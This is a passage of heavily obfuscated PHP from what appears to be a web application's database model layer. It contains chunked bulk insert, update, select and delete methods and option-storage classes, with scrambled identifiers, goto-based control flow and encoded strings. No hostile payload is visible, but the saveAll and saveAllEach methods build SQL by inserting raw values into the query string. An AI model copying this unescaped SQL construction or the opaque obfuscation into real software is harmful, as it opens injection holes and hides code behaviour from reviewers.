$d›≈–ã’–§[$fÓäÈ∞éÚ¯] = call_user_func_array($Få„óî¿ˆﬂ, $B±™≈ÜÖµ‡); } else { $d›≈–ã’–§[$fÓäÈ∞éÚ¯] = call_user_func_array(array(&$this, $Få„óî¿ˆﬂ), $B±™≈ÜÖµ‡); } break; case $B˘ØÇÜÑÆÀ[271]: $d›≈–ã’–§[$fÓäÈ∞éÚ¯] = $d›≈–ã’–§[$E—Ç´¢ä©€[1]]; break; case $B˘ØÇÜÑÆÀ[292]: if (isset($d›≈–ã’–§[$fÓäÈ∞éÚ¯]) && !is_string($d›≈–ã’–§[$fÓäÈ∞éÚ¯])) { $d›≈–ã’–§[$fÓäÈ∞éÚ¯] = json_encode_force($d›≈–ã’–§[$fÓäÈ∞éÚ¯]); } break; case $B˘ØÇÜÑÆÀ[321]: if ($d›≈–ã’–§[$fÓäÈ∞éÚ¯] === $B˘ØÇÜÑÆÀ[33]) { unset($d›≈–ã’–§[$fÓäÈ∞éÚ¯]); } break; case $B˘ØÇÜÑÆÀ[322]: $d›≈–ã’–§[$fÓäÈ∞éÚ¯] = $E—Ç´¢ä©€[1]; default: break; } } if ($d∆ £ﬂÊ„¬ == $B˘ØÇÜÑÆÀ[353]) { $eì¶ªıÍ‚· = strtolower($this->db->getDbType()); if (strpos($eì¶ªıÍ‚·, $B˘ØÇÜÑÆÀ[9]) !== 0) { return; } $Cå∞Ñãÿ¯Â = $this->field(!0)->fields; $CµÃü≠äÊÁ = $Cå∞Ñãÿ¯Â[$B˘ØÇÜÑÆÀ[250]]; if (isset($Cå∞Ñãÿ¯Â[$B˘ØÇÜÑÆÀ[249]])) { unset($CµÃü≠äÊÁ[$Cå∞Ñãÿ¯Â[$B˘ØÇÜÑÆÀ[249]]]); } foreach ($CµÃü≠äÊÁ as $F¶Œ¡ôºÎÃ => $d∆ £ﬂÊ„¬) { if (!isset($d›≈–ã’–§[$F¶Œ¡ôºÎÃ])) { $d›≈–ã’–§[$F¶Œ¡ôºÎÃ] = $B˘ØÇÜÑÆÀ[33]; } } } } private function dataAfterFilter(&$E⁄∆¿ï©Û…) { $A≠´óÏºäÚ =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($this->dataAuto as $Fä´¨¡Ù¨°) { $F∆Ÿ’ÕôÙ√ = $Fä´¨¡Ù¨°[0]; if (!in_array($A≠´óÏºäÚ[355], explode($A≠´óÏºäÚ[47], $Fä´¨¡Ù¨°[2]))) { continue; } if (!isset($E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√])) { continue; } switch (trim($Fä´¨¡Ù¨°[3])) { case $A≠´óÏºäÚ[319]: case $A≠´óÏºäÚ[320]: $d∞ùÓ©ï‚Æ = isset($Fä´¨¡Ù¨°[4]) ? (array) $Fä´¨¡Ù¨°[4] : array(); array_unshift($d∞ùÓ©ï‚Æ, $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√]); if ($A≠´óÏºäÚ[319] == $Fä´¨¡Ù¨°[3]) { $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] = call_user_func_array($Fä´¨¡Ù¨°[1], $d∞ùÓ©ï‚Æ); } else { $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] = call_user_func_array(array(&$this, $Fä´¨¡Ù¨°[1]), $d∞ùÓ©ï‚Æ); } break; case $A≠´óÏºäÚ[271]: $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] = $E⁄∆¿ï©Û…[$Fä´¨¡Ù¨°[1]]; break; case $A≠´óÏºäÚ[292]: $Bπœû≈î¡± = $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√]; $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] = json_decode($Bπœû≈î¡±, !0); if (is_null($E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√])) { $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] = $Bπœû≈î¡±; } break; case $A≠´óÏºäÚ[321]: if ($E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] === $A≠´óÏºäÚ[33]) { unset($E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√]); } break; case $A≠´óÏºäÚ[322]: $E⁄∆¿ï©Û…[$F∆Ÿ’ÕôÙ√] = $Fä´¨¡Ù¨°[1]; default: break; } } } public function saveAll($eŒéÛõ≥Ñ¨) { goto AÛΩ¶√ºñ–; AÛΩ¶√ºñ–: $dåú∏Ωø•ﬂ =& $_SERVER[Öíæ€“”≠éÏË]; $CØÀÙœ˜≠˘ = $this->tablePrefix . $this->tableName; $eﬁÚçßΩ¯• = self::SQL_WHERE_IN_CHUNK; goto E„Œ∂Èû‚à; aÍë˜ü∞ÒÍ: $this->chunkEventSet(); goto AŸœÃ≈Ü¢¢; dá—∫Ô∫‚î: $B⁄œÂ∏ôÜ = array(); $aø∫™ÿŒ‘ﬂ = count($eŒéÛõ≥Ñ¨); for ($DÆä®÷ÕºÀ = 0; $DÆä®÷ÕºÀ < $aø∫™ÿŒ‘ﬂ; $DÆä®÷ÕºÀ++) { $E‹∆„Óô∫û = $eŒéÛõ≥Ñ¨[$DÆä®÷ÕºÀ]; if (!is_array($E‹∆„Óô∫û) || count($E‹∆„Óô∫û) != 4) { continue; } $C…ôØúï¬ﬁ = "\x55\x50\x44\x41\124\x45\40\x60{$CØÀÙœ˜≠˘}\x60\40\123\105\x54\40{$E‹∆„Óô∫û[2]}\x20\75\x20\x43\x41\x53\x45\x20{$E‹∆„Óô∫û[0]}\40\xa"; if ($A±›ù§Ïπè == 0) { $fÙÑãœÜ⁄’ = $C…ôØúï¬ﬁ; } $B⁄œÂ∏ôÜ[] = $dåú∏Ωø•ﬂ[116] . $E‹∆„Óô∫û[1] . $dåú∏Ωø•ﬂ[116]; $A±›ù§Ïπè++; $fÙÑãœÜ⁄’ .= "\x20\x57\x48\x45\116\x20\x27{$E‹∆„Óô∫û[1]}\47\40\124\x48\105\x4e\40\x27{$E‹∆„Óô∫û[3]}\47\x20\xa"; if ($A±›ù§Ïπè == $eﬁÚçßΩ¯• || $DÆä®÷ÕºÀ == $aø∫™ÿŒ‘ﬂ - 1) { goto fâ—∏™¿âÜ; aÌúø¶Ò»®: $A±›ù§Ïπè = 0; $fÙÑãœÜ⁄’ = $C…ôØúï¬ﬁ; $this->chunkEventCheck(count($B⁄œÂ∏ôÜ)); goto C¬ﬂáŒ¥“ı; C¬ﬂáŒ¥“ı: $B⁄œÂ∏ôÜ = array(); goto AöÉ‚È®–„; fâ—∏™¿âÜ: $c∂ƒÚÙ◊„ä = implode($dåú∏Ωø•ﬂ[47], $B⁄œÂ∏ôÜ); $fÙÑãœÜ⁄’ .= "\40\105\116\104\40\40\127\110\x45\122\x45\40{$E‹∆„Óô∫û[0]}\40\111\x4e\40\50{$c∂ƒÚÙ◊„ä}\x29\40"; $this->execute($fÙÑãœÜ⁄’); goto aÌúø¶Ò»®; AöÉ‚È®–„: } } goto aÍë˜ü∞ÒÍ; E„Œ∂Èû‚à: $eŒéÛõ≥Ñ¨ = is_array($eŒéÛõ≥Ñ¨) ? $eŒéÛõ≥Ñ¨ : array(); $fÙÑãœÜ⁄’ = $dåú∏Ωø•ﬂ[375]; $A±›ù§Ïπè = 0; goto dá—∫Ô∫‚î; AŸœÃ≈Ü¢¢: } public function saveAllEach($CñÊêÎÍ·¶) { $A˘ëëèüı¬ =& $_SERVER[Öíæ€“”≠éÏË]; $AÖò†ÿﬁÚÍ = $this->tablePrefix . $this->tableName; foreach ($CñÊêÎÍ·¶ as $C—ôôçëÍÙ) { if (!is_array($C—ôôçëÍÙ) || count($C—ôôçëÍÙ) != 4) { continue; } $F®Ò≈ßπëë = $C—ôôçëÍÙ[0] . $A˘ëëèüı¬[376] . $C—ôôçëÍÙ[1] . $A˘ëëèüı¬[116]; $B¶ë÷∑ß∞• = $C—ôôçëÍÙ[2] . $A˘ëëèüı¬[376] . $C—ôôçëÍÙ[3] . $A˘ëëèüı¬[116]; $cíÈ›∂å¡ë = "\165\160\x64\x61\164\x65\40{$AÖò†ÿﬁÚÍ}\40\x73\x65\x74\x20{$B¶ë÷∑ß∞•}\40\x77\x68\145\162\x65\40{$F®Ò≈ßπëë}\73"; $this->execute($cíÈ›∂å¡ë); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($D◊ùÎÀüÂô = false, $féﬁ¯™éå› = false) { $this->_chunkEvent = $D◊ùÎÀüÂô; $this->_chunkEventParam = $féﬁ¯™éå›; } private function chunkEventCheck($A◊è”≤⁄‡ß) { if (!$this->_chunkEvent) { return; } $fﬁÏôÍÀÙ” = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $fﬁÏôÍÀÙ”[$_SERVER[Öíæ€“”≠éÏË][377]] = $A◊è”≤⁄‡ß; Hook::trigger($this->_chunkEvent, $fﬁÏôÍÀÙ”); } public function addAll($F∂∫õ•Í˘⁄, $C∂©ØŒÎŒµ = array(), $cÙá—ª’›≈ = false) { goto cº‡åÀ†àû; cº‡åÀ†àû: $f·¬‹ÜÎ„ã =& $_SERVER[Öíæ€“”≠éÏË]; ignore_timeout(); $dêÇçΩÎÍ∆ = self::SQL_WHERE_IN_CHUNK; goto f€‡≈úÃ≥®; Aπ»§‹ÓÒç: if (method_exists($this->db, $f·¬‹ÜÎ„ã[270])) { for ($Aª∫ﬂñ∑è˘ = 0; $Aª∫ﬂñ∑è˘ < count($F∂∫õ•Í˘⁄); $Aª∫ﬂñ∑è˘ += $dêÇçΩÎÍ∆) { $DﬁÌ ›œê‘ = array_slice($F∂∫õ•Í˘⁄, $Aª∫ﬂñ∑è˘, $dêÇçΩÎÍ∆); if (!is_array($DﬁÌ ›œê‘) || count($DﬁÌ ›œê‘) == 0) { break; } $Aﬂ√üÖºÀ¡ = $this->db->insertAll($DﬁÌ ›œê‘, $C∂©ØŒÎŒµ, $cÙá—ª’›≈); $this->chunkEventCheck(count($DﬁÌ ›œê‘)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($F∂∫õ•Í˘⁄ as $D—¿úçÊøø => $C«éÀÏ‰“Í) { $Aﬂ√üÖºÀ¡ = $this->db->insert($C«éÀÏ‰“Í, $C∂©ØŒÎŒµ, $cÙá—ª’›≈); } $this->commit(); } if (!1 !== $Aﬂ√üÖºÀ¡) { $Cî€ô™ÌÑ = $this->getLastInsID(); if ($Cî€ô™ÌÑ) { return $Cî€ô™ÌÑ; } } return $Aﬂ√üÖºÀ¡; goto aıíË€”≈é; f€‡≈úÃ≥®: if (empty($F∂∫õ•Í˘⁄)) { $this->error = think_lang($f·¬‹ÜÎ„ã[269]); return !1; } $C∂©ØŒÎŒµ = $this->_parseOptions($C∂©ØŒÎŒµ); foreach ($F∂∫õ•Í˘⁄ as $D—¿úçÊøø => $C«éÀÏ‰“Í) { $F∂∫õ•Í˘⁄[$D—¿úçÊøø] = $this->_facade($C«éÀÏ‰“Í); $this->_beforeInsert($F∂∫õ•Í˘⁄[$D—¿úçÊøø], $C∂©ØŒÎŒµ); } goto Aπ»§‹ÓÒç; aıíË€”≈é: } public function save($bıı∆ßÁíÚ = '', $f—ôÃÑ ôÛ = array()) { goto FÆûíœ≥Ò√; aØÙ≈É§≥ë: $døàÿáêπò = $c´÷Ÿ∑¯Ö[$Aâ∫’ÙÉ¯∏[273]][$E˜ûÊÀèÍ–][1]; $døàÿáêπò = is_array($døàÿáêπò) ? $døàÿáêπò : array(); $dÜ‘ã…ï“∞ = count($døàÿáêπò); goto aÿøí∂≥∑ƒ; FÆûíœ≥Ò√: $Aâ∫’ÙÉ¯∏ =& $_SERVER[Öíæ€“”≠éÏË]; $b‘Û©’ı©≈ = self::SQL_WHERE_IN_CHUNK; $c´÷Ÿ∑¯Ö = $this->optionsValue(); goto CÇùÊÉê ﬂ; CÇùÊÉê ﬂ: $E˜ûÊÀèÍ– = $this->findWhereField($c´÷Ÿ∑¯Ö); if (!$E˜ûÊÀèÍ–) { return parent::save($bıı∆ßÁíÚ, $f—ôÃÑ ôÛ); } $Fâ†ıÛ´íÉ = 0; goto aØÙ≈É§≥ë; aÿøí∂≥∑ƒ: for ($eÔå†ëãÔ‚ = 0; $eÔå†ëãÔ‚ < $dÜ‘ã…ï“∞; $eÔå†ëãÔ‚ += $b‘Û©’ı©≈) { $bΩ¿ø¥Ï≤ﬁ = array_slice($døàÿáêπò, $eÔå†ëãÔ‚, $b‘Û©’ı©≈); if (!is_array($bΩ¿ø¥Ï≤ﬁ) || count($bΩ¿ø¥Ï≤ﬁ) == 0) { break; } $c´÷Ÿ∑¯Ö[$Aâ∫’ÙÉ¯∏[273]][$E˜ûÊÀèÍ–][1] = $bΩ¿ø¥Ï≤ﬁ; $this->optionsValue($c´÷Ÿ∑¯Ö); $Fâ†ıÛ´íÉ += parent::save($bıı∆ßÁíÚ, $f—ôÃÑ ôÛ); $this->chunkEventCheck(count($bΩ¿ø¥Ï≤ﬁ)); } $this->chunkEventSet(); return $Fâ†ıÛ´íÉ; goto C´Ûó’¢Úª; C´Ûó’¢Úª: } public function add($døœÌ ›ç– = '', $a™á©º•Ωë = array(), $AÏ¶‡ÇÌ‚∏ = false) { if ($this->addTaskStatus && is_array($døœÌ ›ç–)) { $this->addTaskData[] = $døœÌ ›ç–; return; } return parent::add($døœÌ ›ç–, $a™á©º•Ωë, $AÏ¶‡ÇÌ‚∏); } public function parseWhereLike($aπ∞âÚä¨∆, $CŒ¨¬·ﬂ∏É = '', $aœ∂Ô˘ùÚ€ = false, &$eµäÙÆÚπÑ = false) { goto eò€’†™∏Ö; bÁÿÑÖÑ±è: foreach ($aπ∞âÚä¨∆ as $bƒ¥Óµ®◊⁄ => $Bòö≠≤ÓÊê) { if (is_array($Bòö≠≤ÓÊê) && count($Bòö≠≤ÓÊê) == 2 && $Bòö≠≤ÓÊê[0] == $e©èπÿıÑå[380] && is_string($Bòö≠≤ÓÊê[1]) && substr($Bòö≠≤ÓÊê[1], 0, 1) == $e©èπÿıÑå[381] && substr($Bòö≠≤ÓÊê[1], strlen($Bòö≠≤ÓÊê[1]) - 1, 1) == $e©èπÿıÑå[381]) { goto Bûå…›ëÀ¢; fÙÁô‚Íó‹: continue; goto fÊ›àﬂÉ…É; Fë≈«À¿Ó´: if ($aÂÎÁËÉ§·[$e©èπÿıÑå[383]]) { $d’£÷∞æ≠≠ = $e©èπÿıÑå[384] . $dπÊà®œ£· . $e©èπÿıÑå[385]; if ($aÂÎÁËÉ§·[$e©èπÿıÑå[386]]) { $d’£÷∞æ≠≠ = $e©èπÿıÑå[385] . $dπÊà®œ£· . $e©èπÿıÑå[384]; } } $D”∑⁄è∂óÌ[$D•∫úàÑÀÀ] = $e©èπÿıÑå[387] . $dç√‰¶ÉÍ‹ . $e©èπÿıÑå[388] . $d’£÷∞æ≠≠ . $e©èπÿıÑå[389]; $D•∫úàÑÀÀ++; goto fÙÁô‚Íó‹; Bûå…›ëÀ¢: $eµäÙÆÚπÑ = !0; $dç√‰¶ÉÍ‹ = is_string($bƒ¥Óµ®◊⁄) ? $bƒ¥Óµ®◊⁄ : $CŒ¨¬·ﬂ∏É; $dπÊà®œ£· = substr($Bòö≠≤ÓÊê[1], 1, strlen($Bòö≠≤ÓÊê[1]) - 2); goto Cä≤ŸÖ—üÁ; Cä≤ŸÖ—üÁ: $dπÊà®œ£· = $this->db->escapeString($dπÊà®œ£·); if (!strpos($dç√‰¶ÉÍ‹, $e©èπÿıÑå[95])) { $dç√‰¶ÉÍ‹ = $e©èπÿıÑå[382] . $dç√‰¶ÉÍ‹ . $e©èπÿıÑå[382]; } $d’£÷∞æ≠≠ = $e©èπÿıÑå[182] . $dπÊà®œ£· . $e©èπÿıÑå[182]; goto Fë≈«À¿Ó´; fÊ›àﬂÉ…É: } if (is_array($Bòö≠≤ÓÊê)) { $CŒ¨¬·ﬂ∏É = is_string($bƒ¥Óµ®◊⁄) ? $bƒ¥Óµ®◊⁄ : $CŒ¨¬·ﬂ∏É; $Bòö≠≤ÓÊê = $this->parseWhereLike($Bòö≠≤ÓÊê, $CŒ¨¬·ﬂ∏É, !0, $eµäÙÆÚπÑ); } if (is_numeric($bƒ¥Óµ®◊⁄)) { $D”∑⁄è∂óÌ[$D•∫úàÑÀÀ] = $Bòö≠≤ÓÊê; $D•∫úàÑÀÀ++; } else { $D”∑⁄è∂óÌ[$bƒ¥Óµ®◊⁄] = $Bòö≠≤ÓÊê; } } if ($eµäÙÆÚπÑ && !$aœ∂Ô˘ùÚ€) { } return $D”∑⁄è∂óÌ; goto BÖÒàƒﬂÖÈ; fÑÛíµ∫û€: if (!is_array($aπ∞âÚä¨∆)) { return $aπ∞âÚä¨∆; } $D”∑⁄è∂óÌ = array(); $D•∫úàÑÀÀ = 0; goto bÁÿÑÖÑ±è; eò€’†™∏Ö: $e©èπÿıÑå =& $_SERVER[Öíæ€“”≠éÏË]; $aÂÎÁËÉ§· = $GLOBALS[$e©èπÿıÑå[6]][$e©èπÿıÑå[378]]; if (!$aÂÎÁËÉ§·[$e©èπÿıÑå[379]]) { return $aπ∞âÚä¨∆; } goto fÑÛíµ∫û€; BÖÒàƒﬂÖÈ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($DµôıàØ∑‘ = array()) { goto F≥ø’òïÛı; AÒÈŸ…à∑√: $A∞ø∏Ç£±ª = $this->findWhereField($c◊âëÉ’´⁄); if (!$A∞ø∏Ç£±ª || isset($c◊âëÉ’´⁄[$aâÙ‡ôàèµ[290]]) || isset($c◊âëÉ’´⁄[$aâÙ‡ôàèµ[351]])) { return parent::select($DµôıàØ∑‘); } $EîÁ“‰∫õÉ = $c◊âëÉ’´⁄[$aâÙ‡ôàèµ[273]][$A∞ø∏Ç£±ª][1]; goto FΩÇÎèóê”; FÉõπ¿¶™Ù: return $b»åäóöÚ◊; goto fÿ÷µñ∫≥›; FΩÇÎèóê”: $EîÁ“‰∫õÉ = is_array($EîÁ“‰∫õÉ) ? $EîÁ“‰∫õÉ : array(); $b»åäóöÚ◊ = null; for ($d‚⁄äÿƒ¿Ò = 0; $d‚⁄äÿƒ¿Ò < count($EîÁ“‰∫õÉ); $d‚⁄äÿƒ¿Ò += $fùﬂ©ïïÉé) { $e÷–ÚŸ¯ââ = array_slice($EîÁ“‰∫õÉ, $d‚⁄äÿƒ¿Ò, $fùﬂ©ïïÉé); if (!is_array($e÷–ÚŸ¯ââ) || count($e÷–ÚŸ¯ââ) == 0) { break; } $c◊âëÉ’´⁄[$aâÙ‡ôàèµ[273]][$A∞ø∏Ç£±ª][1] = $e÷–ÚŸ¯ââ; $this->optionsValue($c◊âëÉ’´⁄); $BÆâ†¥ÎÂÀ = parent::select($DµôıàØ∑‘); if (!$BÆâ†¥ÎÂÀ) { continue; } $b»åäóöÚ◊ = is_array($b»åäóöÚ◊) ? $b»åäóöÚ◊ : array(); $b»åäóöÚ◊ = array_merge($b»åäóöÚ◊, $BÆâ†¥ÎÂÀ); } goto FÉõπ¿¶™Ù; F≥ø’òïÛı: $aâÙ‡ôàèµ =& $_SERVER[Öíæ€“”≠éÏË]; $fùﬂ©ïïÉé = self::SQL_WHERE_IN_CHUNK; $c◊âëÉ’´⁄ = $this->optionsValue(); goto AÒÈŸ…à∑√; fÿ÷µñ∫≥›: } public function delete($fëáôï’¡ó = array()) { goto A±–í—©ñ©; fçíãäô∫Î: return $Fäî¥†ÏÌ€; goto eÚﬁıÕ≈¢Ó; A±–í—©ñ©: $EçØµŸô„ =& $_SERVER[Öíæ€“”≠éÏË]; $eÒ€∆ºÌ˘û = self::SQL_WHERE_IN_CHUNK; $Eü˘‰ﬁÇâù = $this->optionsValue(); goto f‡›≠ëßÌ∆; f‡›≠ëßÌ∆: $Dê°¡Úﬂ´¶ = $this->findWhereField($Eü˘‰ﬁÇâù); if (!$Dê°¡Úﬂ´¶) { return parent::delete($fëáôï’¡ó); } $Fäî¥†ÏÌ€ = 0; goto BêæØãù©ö; BêæØãù©ö: $c†ªÚÁÉèó = $Eü˘‰ﬁÇâù[$EçØµŸô„[273]][$Dê°¡Úﬂ´¶][1]; $c†ªÚÁÉèó = is_array($c†ªÚÁÉèó) ? $c†ªÚÁÉèó : array(); for ($Dû–¥ÖÈæ≤ = 0; $Dû–¥ÖÈæ≤ < count($c†ªÚÁÉèó); $Dû–¥ÖÈæ≤ += $eÒ€∆ºÌ˘û) { $cîßöå„Ñ÷ = array_slice($c†ªÚÁÉèó, $Dû–¥ÖÈæ≤, $eÒ€∆ºÌ˘û); if (!is_array($cîßöå„Ñ÷) || count($cîßöå„Ñ÷) == 0) { break; } $Eü˘‰ﬁÇâù[$EçØµŸô„[273]][$Dê°¡Úﬂ´¶][1] = $cîßöå„Ñ÷; $this->optionsValue($Eü˘‰ﬁÇâù); $Fäî¥†ÏÌ€ += parent::delete($fëáôï’¡ó); } goto fçíãäô∫Î; eÚﬁıÕ≈¢Ó: } private function findWhereField($BØ’Òãï©°) { $Dêÿ±‹Üê¯ =& $_SERVER[Öíæ€“”≠éÏË]; $eƒè»Û¿åâ = self::SQL_WHERE_IN_CHUNK; if (!is_array($BØ’Òãï©°) || !is_array($BØ’Òãï©°[$Dêÿ±‹Üê¯[273]])) { return !1; } foreach ($BØ’Òãï©°[$Dêÿ±‹Üê¯[273]] as $F¶ÚœŒòπ‡ => $Aï£ﬁîò¥ƒ) { if (is_array($Aï£ﬁîò¥ƒ) && isset($Aï£ﬁîò¥ƒ[0]) && is_string($Aï£ﬁîò¥ƒ[0]) && strtolower($Aï£ﬁîò¥ƒ[0]) == $Dêÿ±‹Üê¯[7] && is_array($Aï£ﬁîò¥ƒ[1]) && count($Aï£ﬁîò¥ƒ[1]) > $eƒè»Û¿åâ) { ignore_timeout(); return $F¶ÚœŒòπ‡; } } return !1; } public function setMasterDB($FËä˜©‚Ïê = true) { think_config($_SERVER[Öíæ€“”≠éÏË][390], $FËä˜©‚Ïê); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\155\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($d·ˆä¡âáÆ = false, $f∆£“—Íñ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\x65", $FıÕôŸâü∂ = false) { $cÖ∏⁄‰µ∂É = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cÖ∏⁄‰µ∂É) { return $d·ˆä¡âáÆ ? null : array(); } if (!$d·ˆä¡âáÆ) { $cÖ∏⁄‰µ∂É = array_filter(array_values($cÖ∏⁄‰µ∂É)); return array_sort_by($cÖ∏⁄‰µ∂É, $f∆£“—Íñ, $FıÕôŸâü∂); } return $cÖ∏⁄‰µ∂É[$_SERVER[Öíæ€“”≠éÏË][391] . $d·ˆä¡âáÆ]; } public function insert($EÃ§⁄É‡µ›) { goto C„£Ø“ÈàÂ; déÕ’ÏÇ¢ﬂ: $D‰ÑèŒ≠∞· = $D‰ÑèŒ≠∞· ? $D‰ÑèŒ≠∞· : 0; $EÃ§⁄É‡µ›[$Dç≥Êﬁ•Œí[394]] = ++$D‰ÑèŒ≠∞·; $EÃ§⁄É‡µ›[$Dç≥Êﬁ•Œí[194]] = time(); goto AæìéÒÜÎ‚; C„£Ø“ÈàÂ: $Dç≥Êﬁ•Œí =& $_SERVER[Öíæ€“”≠éÏË]; $EÃ§⁄É‡µ› = array_field_key($EÃ§⁄É‡µ›, $this->field); $D‰ÑèŒ≠∞· = Model($this->modelType)->get($Dç≥Êﬁ•Œí[392], $this->optionType . $Dç≥Êﬁ•Œí[393]); goto déÕ’ÏÇ¢ﬂ; AæìéÒÜÎ‚: $EÃ§⁄É‡µ›[$Dç≥Êﬁ•Œí[84]] = time(); Model($this->modelType)->set($Dç≥Êﬁ•Œí[392], $D‰ÑèŒ≠∞·, $this->optionType . $Dç≥Êﬁ•Œí[393]); Model($this->modelType)->set($Dç≥Êﬁ•Œí[391] . $D‰ÑèŒ≠∞·, $EÃ§⁄É‡µ›, $this->optionType); goto d≠«õéΩ≤Ò; d≠«õéΩ≤Ò: return $D‰ÑèŒ≠∞·; goto eã—Áåîª∏; eã—Áåîª∏: } public function update($fèø‹•©∆, $AΩÊÃØßœâ) { goto BÊ˜∑¬ò€û; aá∞‰≠ñèÑ: if (!$aåäå¡Ùπ || !$fèø‹•©∆) { return !1; } $AΩÊÃØßœâ = array_merge($aåäå¡Ùπ, $AΩÊÃØßœâ); $AΩÊÃØßœâ[$dö™™ø±Ê°[84]] = time(); goto cô¥¶—œàﬂ; BÊ˜∑¬ò€û: $dö™™ø±Ê° =& $_SERVER[Öíæ€“”≠éÏË]; $AΩÊÃØßœâ = array_field_key($AΩÊÃØßœâ, $this->field); $aåäå¡Ùπ = $this->listData($fèø‹•©∆); goto aá∞‰≠ñèÑ; cô¥¶—œàﬂ: return Model($this->modelType)->set($dö™™ø±Ê°[391] . $fèø‹•©∆, $AΩÊÃØßœâ, $this->optionType); goto FºÎÃ≥„îŸ; FºÎÃ≥„îŸ: } public function remove($bΩ£Ü™ñÀ) { if (!$bΩ£Ü™ñÀ) { return !1; } return Model($this->modelType)->remove($_SERVER[Öíæ€“”≠éÏË][391] . $bΩ£Ü™ñÀ, $this->optionType); } public function clear() { $DÈñã∆ÒïÂ =& $_SERVER[Öíæ€“”≠éÏË]; Model($this->modelType)->remove($DÈñã∆ÒïÂ[392], $this->optionType . $DÈñã∆ÒïÂ[393]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($fÇµ ÓœÓù, $d¥ºå◊Ò»Ö) { if (!$d¥ºå◊Ò»Ö) { return !1; } $FÕüÙÑ”‰– = $this->listData(); $FÕüÙÑ”‰– = array_to_keyvalue($FÕüÙÑ”‰–, $fÇµ ÓœÓù); return isset($FÕüÙÑ”‰–[$d¥ºå◊Ò»Ö]) ? $FÕüÙÑ”‰–[$d¥ºå◊Ò»Ö] : !1; } public function findByName($aíÕóºΩåË) { return $this->findByKey($_SERVER[Öíæ€“”≠éÏË][28], $aíÕóºΩåË); } protected function resetData($Cã˜⁄âÈ£›) { $B€ıæÉÆﬁô =& $_SERVER[Öíæ€“”≠éÏË]; $Cã˜⁄âÈ£› = is_array($Cã˜⁄âÈ£›) ? $Cã˜⁄âÈ£› : array(); $Dåî≥ÆÏﬁÿ = array(); for ($AŒÔç‹∏ÙÔ = 0; $AŒÔç‹∏ÙÔ < count($Cã˜⁄âÈ£›); $AŒÔç‹∏ÙÔ++) { $Dåî≥ÆÏﬁÿ[$B€ıæÉÆﬁô[391] . $Cã˜⁄âÈ£›[$AŒÔç‹∏ÙÔ][$B€ıæÉÆﬁô[394]]] = $Cã˜⁄âÈ£›[$AŒÔç‹∏ÙÔ]; } return Model($this->modelType)->set($Dåî≥ÆÏﬁÿ, !1, $this->optionType); } private function getAutoName($Fû±ÖÚçì±) { $b≈Òô∆À†ä = array_to_keyvalue($this->listData(), $_SERVER[Öíæ€“”≠éÏË][28]); if (!$b≈Òô∆À†ä || !isset($b≈Òô∆À†ä[$Fû±ÖÚçì±])) { return $Fû±ÖÚçì±; } for ($Dﬁµ≤≥É˘Â = 1; $Dﬁµ≤≥É˘Â < count($b≈Òô∆À†ä); $Dﬁµ≤≥É˘Â++) { $dŒ¡Éÿ®ã⁄ = $Fû±ÖÚçì± . "\50{$Dﬁµ≤≥É˘Â}\51"; if (!isset($b≈Òô∆À†ä[$dŒ¡Éÿ®ã⁄])) { return $dŒ¡Éÿ®ã⁄; } } return $dŒ¡Éÿ®ã⁄; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Cæå¬™“®“ = false, $cî ûÓíÉµ = '', $b‡ÈéúéÈ¡ = false) { goto c¢®à™º∫ä; E•æŸ‰û–á: $BñæõÊ˘ôÊ = is_array($BñæõÊ˘ôÊ) ? $BñæõÊ˘ôÊ : array(); if (is_array($F◊ÕŒàä«â)) { $F◊ÕŒàä«â = array_merge($BñæõÊ˘ôÊ, $F◊ÕŒàä«â); return $Cæå¬™“®“ ? isset($F◊ÕŒàä«â[$Cæå¬™“®“]) ? $F◊ÕŒàä«â[$Cæå¬™“®“] : null : $F◊ÕŒàä«â; } $c„„ÇÒ˜ÆÛ = $this->filterWhere(array($a‚Íá≠¿›˘[29] => $cî ûÓíÉµ)); goto CÇ¿æã¢‹∑; c¢®à™º∫ä: $a‚Íá≠¿›˘ =& $_SERVER[Öíæ€“”≠éÏË]; $F◊ÕŒàä«â = $this->cacheGet($cî ûÓíÉµ); $BñæõÊ˘ôÊ = $this->optionDefault($cî ûÓíÉµ); goto E•æŸ‰û–á; düÑ‰€∏Ò¢: $this->cacheSet($cî ûÓíÉµ, $F◊ÕŒàä«â); $F◊ÕŒàä«â = array_merge($BñæõÊ˘ôÊ, $F◊ÕŒàä«â); return $Cæå¬™“®“ ? $F◊ÕŒàä«â[$Cæå¬™“®“] : $F◊ÕŒàä«â; goto cÓç–—Œ⁄¶; CÇ¿æã¢‹∑: $F◊ÕŒàä«â = $this->where($c„„ÇÒ˜ÆÛ)->select(); $F◊ÕŒàä«â = array_to_keyvalue($F◊ÕŒàä«â, $a‚Íá≠¿›˘[93], $a‚Íá≠¿›˘[372]); foreach ($F◊ÕŒàä«â as $dí‰ê‰ù—ƒ => $B⁄÷ƒ¿‘“¯) { if ($b‡ÈéúéÈ¡ || in_array($dí‰ê‰ù—ƒ, $this->jsonField)) { $F◊ÕŒàä«â[$dí‰ê‰ù—ƒ] = 